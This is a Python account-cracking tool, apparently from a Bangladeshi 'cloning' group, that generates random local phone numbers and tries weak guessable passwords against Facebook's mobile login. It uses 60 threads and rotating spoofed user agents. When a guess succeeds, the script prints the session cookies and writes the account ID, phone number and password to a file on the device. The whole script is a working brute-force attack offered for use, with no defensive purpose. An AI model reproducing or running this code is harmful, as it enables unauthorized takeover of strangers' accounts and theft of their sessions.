from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
RED = '\x1b[38;5;46m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
R = '{RED}' 
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://mbasic.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
ugen=[]
uas=[]
usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
rr = random.randint
for dx in range(10000):
    aa='Mozilla/5.0 (Linux; Android 10'
    b=random.choice(['6','7','8','9','10','11','12','13','14','15','16'])
    c='Moto X40 Pro)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/605.1.15 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile/93.0.5236.82 Safari/537.36'
    uaku=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku)
for x in range(10):
    a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
    b=random.randrange(100, 9999)
    c=random.randrange(100, 9999)
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    h=random.randrange(1, 9)
    i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
    j=random.randrange(1, 9)
    k=random.randrange(1, 9)
    l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
    uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'

nka = [
"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
]


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

  
logo =""" 
\033[1;96m █████ \033[0;92m ██ \033[0;91m      ██████ \033[1;96m ███    ██ \033[0;92m███████ 
\033[1;96m██   ██\033[0;92m ██   \033[0;91m   ██    ██ \033[1;96m████   ██ \033[0;92m██      
\033[1;96m███████ \033[0;92m██ \033[0;91m     ██    ██ \033[1;96m██ ██  ██ \033[0;92m█████   
\033[1;96m██   ██ \033[0;92m██    \033[0;91m  ██    ██ \033[1;96m██  ██ ██ \033[0;92m██      
\033[1;96m██   ██ \033[0;92m███████\033[0;91m  ██████ \033[1;96m ██   ████ \033[0;92m███████              
\033[0;92m┏━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┓\033[0;92m
┃\033[1;33mDEVOLPER : RAKIB      ┃\033[1;32mTOOL : \033[1;36mBD/ONLY ┃    
┃\033[1;96mFACEBOOK :\033[1;32m ᴹᴰ ᴿᴬᴷᴵᴮ ᴷᴵᴺᴳ     ┃\033[1;33mVERSION : \033[1;32m1.1  ┃
\033[0;92m┣━━━━━━━━━━━━━━━━━━━━━━┳━━┻━━━━━━━━━━━━━━━┫\033[0;92m    
┃\033[1;97mGITHUB : \033[1;32mRAKIB-HACKING-TIM     ┃\033[1;33mTYPE :\033[1;97m FREE RANDOM┃    
\033[0;92m┗━━━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━┛\033[0;92m"""
def Main():
	os.system('clear')
	print(logo)
	print("[\033[1;97mA\33[1;92m] START RANDOM CRACKING")
	print("[\033[1;97mB\33[1;92m] RAKIB ADMIN FB ACCOUNT")
	print("[\033[1;97mC\33[1;92m] JOIN MESSAGER GROUP")
	print('[\033[1;97mD\33[1;92m] EXIT PROGRAMMING')
	opt = input('[+] SELECT :')
	if opt in ["A","1"]:
		virusA()
	if opt in ["B","2"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100088562019366');time.sleep(1)
		fb()
	if opt in ["C","3"]:
		os.system('xdg-open https://m.me/j/AbYROttlLrk6McA7/');time.sleep(1)
		group()
	if opt in ["D","0"]:
		exit()
	else:
		print('\n\033[1;92mChoose valid option\033[0;97m');time.sleep(1)
		Main()
def admin():
	os.system('clear')
	print(logo)
	print(48*'━')
	print(' [1] Contract Number ')
	print(' [2] JOIN MY FB GROUP ')
	print(' [3]  FB ID Contract ')
	print(' [0] Back to Main menu')
	bal = input('[+] SELECT :')
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801724273808');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://facebook.com/groups/628769692687273/');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100088562019366');time.sleep(1)
		admin()
	if bal =='0':
		Main()
		
def virusA():
	user=[]
	os.system('clear')
	print(logo)
	print(" \033[0;92m┏━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m BD SIM CODE : \033[1;91m017 015 018 019")
	kode = input(' \033[0;92m┗━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m SELECT      :\033[1;91m ')
	doamin = ' BD Number id cloner [ONLY-OK] '
	print(' \033[0;92m┏━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m EXAMPLE     :\033[1;91m 1000 5000 10000')
	limit = int(input(' \033[0;92m┗━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m LIMIT       :\033[1;91m '))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=60) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('\033[0;92m┏━\033[0;92m[\033[1;91m+\033[0;92m]\033[0;92m TOTAL ID   :\033[1;97m  '+tl)
		print(f'\033[0;92m┣━[\033[1;91m+\033[0;92m]\033[0;92m SIM CODE   : \033[1;97m {kode} ')
		print('\033[0;92m┗━[\033[1;91m+\033[0;92m]\033[0;92m IF NO RESULT \033[1;33m[ON/OFF\033[1;33m]\033[1;33m \033[0;92mAIRPLANE  MODE')
		print(44*'━')
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','09876543']
			yaari.submit(b,uid,pwx,tl)
	print(44*'━')
	print(' [💙] Crack process has been completed')
	print(' [💙] Ids saved in ok.txt,cp.txt')
	print(44*'━')
	exit()

def b(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;91m[\033[0;92mFINDING\033[1;91m]\033[1;97m<>\033[1;91m[\033[1;33m%s/%s\033[1;91m]\033[1;97m\033[1;97m<>\033[1;91m[\033[0;92mALIVE:%s\033[1;91m]\033[1;91m '%(loop,tl,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
           'method': 'GET',
           'path': '/login/device-based/login/async/',
           'scheme': 'https',
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
           'accept-language': 'en-US,en;q=0.9',
           'cache-control': 'max-age=0',
           'sec-ch-prefers-color-scheme': 'light',
           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
           'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
           'sec-ch-ua-mobile': '?1',
           'sec-ch-ua-platform': '"Android"',
           'sec-ch-ua-platform-version': '"12.0.0"',
           'sec-fetch-dest': 'document',
           'sec-fetch-mode': 'navigate',
           'sec-fetch-site': 'none',
           'sec-fetch-user': '?1',
           'upgrade-insecure-requests': '1',
           'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid=coki[151:166]
                print(f'\\3[1;92m [RAKIB-OK] '+cid+' | '+ps+'\3[0;92m')
                print(f'\r\033[1;36m=[🤍]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/RAKIB-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
    except:

        pass
Main()
